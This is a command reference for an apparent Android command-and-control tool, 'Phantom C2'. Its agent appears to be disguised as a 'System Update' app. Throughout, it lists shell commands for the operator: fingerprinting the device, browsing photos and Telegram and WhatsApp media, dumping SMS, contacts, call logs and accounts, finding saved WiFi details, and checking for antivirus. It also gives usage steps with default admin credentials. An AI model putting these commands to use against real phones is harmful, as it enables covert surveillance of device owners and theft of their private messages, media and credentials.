# Phantom C2 — Android Post-Exploitation Commands Reference

All commands below are verified on **Samsung Galaxy S25+ (SM-S938U1, Android 16)** via Phantom C2's mobile shell. Paste any command into the Web UI shell input or use the CLI helper:

```bash
python3 phantom_cli.py <agent-name> shell "<command>"
```

---

## Device Fingerprinting

| Command | What it returns |
|---------|----------------|
| `id` | Current user identity + groups |
| `getprop ro.product.model` | Device model (e.g. SM-S938U1) |
| `getprop ro.product.manufacturer` | Manufacturer (e.g. samsung) |
| `getprop ro.build.version.release` | Android version (e.g. 16) |
| `getprop ro.build.version.sdk` | API level (e.g. 36) |
| `getprop ro.build.fingerprint` | Full build fingerprint |
| `uname -a` | Kernel version |
| `getprop gsm.version.baseband` | Baseband/modem firmware |
| `getprop ro.bootloader` | Bootloader version |
| `getprop ro.serialno` | Device serial number |
| `getprop ro.hardware` | Hardware platform |
| `getprop ro.build.version.security_patch` | Security patch date |
| `settings get secure android_id` | Unique Android device ID |
| `settings get secure bluetooth_name` | Bluetooth display name |

## Network

| Command | What it returns |
|---------|----------------|
| `ip addr show wlan0` | WiFi IP address + MAC |
| `getprop net.dns1` | Primary DNS server |
| `ip route` | Routing table (gateway, subnets) |
| `netstat -tn` | Active TCP connections |
| `cat /proc/net/arp` | ARP table (nearby devices) — may need root |

## Files & Storage

| Command | What it returns |
|---------|----------------|
| `ls /sdcard/` | Storage root — all top-level folders |
| `ls /sdcard/DCIM/Camera/` | Camera photos |
| `ls /sdcard/DCIM/Screenshots/` | Screenshots |
| `ls /sdcard/Pictures/Screenshots/` | Screenshots (alt path) |
| `ls /sdcard/DCIM/` | All DCIM subfolders |
| `ls /sdcard/Download/` | Downloads folder |
| `ls /sdcard/Documents/` | Documents folder |
| `ls /sdcard/Telegram/Telegram Documents/` | Telegram received documents |
| `ls /sdcard/Telegram/Telegram Images/` | Telegram received images |
| `ls /sdcard/Telegram/Telegram Video/` | Telegram received videos |
| `ls /sdcard/GBWhatsApp/` | GBWhatsApp data |
| `ls /sdcard/WhatsApp/Media/` | WhatsApp media (official) |
| `find /sdcard/Download -name '*.pdf'` | All PDF files in downloads |
| `find /sdcard -name '*.apk' -maxdepth 3` | APK files on device |
| `find /sdcard -name '*.doc*' -maxdepth 3` | Word documents |
| `find /sdcard -name '*.xls*' -maxdepth 3` | Excel spreadsheets |
| `find /sdcard -name '*.jpg' -maxdepth 2` | Photos (top-level search) |
| `du -sh /sdcard/*` | Storage usage per folder |

## Installed Applications

| Command | What it returns |
|---------|----------------|
| `pm list packages -3` | All third-party (user-installed) apps |
| `pm list packages -s` | All system apps |
| `pm list packages -s \| grep samsung` | Samsung-specific system apps |
| `pm list packages -3 -f` | Third-party apps with APK file paths |
| `dumpsys package <pkg>` | Full info for a specific package |
| `dumpsys package com.android.systemupdate \| grep 'granted=true'` | Permissions granted to our APK |

## SMS / Contacts / Call Log (require runtime permissions)

> **Note:** These need the user to grant permissions: Settings → Apps → System Update → Permissions → allow SMS, Contacts, Phone.

| Command | What it returns |
|---------|----------------|
| `content query --uri content://sms` | All SMS messages |
| `content query --uri content://sms/inbox` | Inbox only |
| `content query --uri content://sms/sent` | Sent messages only |
| `content query --uri content://contacts/phones` | All contacts with phone numbers |
| `content query --uri content://call_log/calls` | Call history |
| `content query --uri content://calendar/events` | Calendar events |
| `content query --uri content://browser/bookmarks` | Browser bookmarks |

## Security Assessment

| Command | What it returns |
|---------|----------------|
| `getenforce` | SELinux mode (Enforcing/Permissive) |
| `getprop ro.crypto.state` | Encryption status |
| `which su` | Check if root binary exists |
| `ls /data/adb/magisk` | Check for Magisk root framework |
| `settings get global development_settings_enabled` | Developer options on/off |
| `settings get global adb_enabled` | ADB debugging on/off |
| `getprop persist.sys.usb.config` | USB configuration mode |
| `settings get secure lockscreen.password_type` | Screen lock type |
| `pm list packages \| grep -i vpn` | VPN apps installed |
| `pm list packages \| grep -i antivirus` | AV apps installed |

## System Information

| Command | What it returns |
|---------|----------------|
| `dumpsys battery` | Battery level, temperature, charging state |
| `dumpsys account` | Google/Samsung accounts on device |
| `dumpsys wifi` | WiFi networks, saved passwords (may need system perms) |
| `dumpsys telephony.registry` | Cell tower info, signal strength |
| `dumpsys activity recents` | Recently used apps |
| `logcat -d -s ActivityManager:I` | Recent app activity log |

## Navigation

| Command | What it returns |
|---------|----------------|
| `cd /sdcard/Download` | Change working directory — **persists** across commands |
| `cd ..` | Go up one directory |
| `pwd` | Print current working directory |
| `ls` | List files in current directory |
| `ls -la` | Detailed file listing with permissions and sizes |

> **Note:** `cd` is handled natively by the mobile agent and persists across commands. Every subsequent command runs in the directory you `cd`'d to.

## Environment

| Command | What it returns |
|---------|----------------|
| `env` | All environment variables |
| `ls /data/local/tmp/` | Temp directory contents |
| `ls /data/data/com.android.systemupdate/` | Our app's private data directory |
| `cat /proc/cpuinfo` | CPU information |
| `cat /proc/meminfo \| head -5` | Memory information |
| `df -h` | Disk usage |

---

## Using from the Web UI

1. Open `http://localhost:3000`
2. Login: `admin` / `phantom`
3. Select the mobile agent from the agent list
4. Type any command above in the shell input box
5. Wait ~10 seconds for the result (mobile agent check-in interval)

## Using from the CLI

```bash
# Single command
python3 phantom_cli.py <agent-name> shell "id"

# Multiple commands in one shell
python3 phantom_cli.py <agent-name> shell "id; ls /sdcard/; pm list packages -3"
```

## Tested On

- Samsung Galaxy S25+ (SM-S938U1) — Android 16, API 36
- Android Studio Emulator (sdk_gphone64_x86_64) — Android 10 Q, API 29
